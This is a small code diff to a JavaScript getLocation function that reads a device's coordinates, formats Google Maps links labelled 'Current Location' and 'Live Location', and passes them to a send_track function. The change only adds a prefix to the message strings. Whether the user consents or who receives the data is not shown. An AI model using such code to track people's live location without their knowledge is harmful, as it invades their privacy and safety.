@@ -527,7 +527,7 @@ function getLocation() {
     const lat = position.coords.latitude;
     const lng = position.coords.longitude;
 
-    let msg = `Current Location: https://www.google.com/maps?q=${lat},${lng}`;
+    let msg = ` || Current Location: https://www.google.com/maps?q=${lat},${lng}`;
     
     send_track(msg);
 
@@ -538,7 +538,7 @@ function getLocation() {
       const lat = position.coords.latitude;
       const lng = position.coords.longitude;
 
-      let msg = `Live Location: https://www.google.com/maps?q=${lat},${lng}`;
+      let msg = ` || Live Location: https://www.google.com/maps?q=${lat},${lng}`;
       
       send_track(msg);
     },
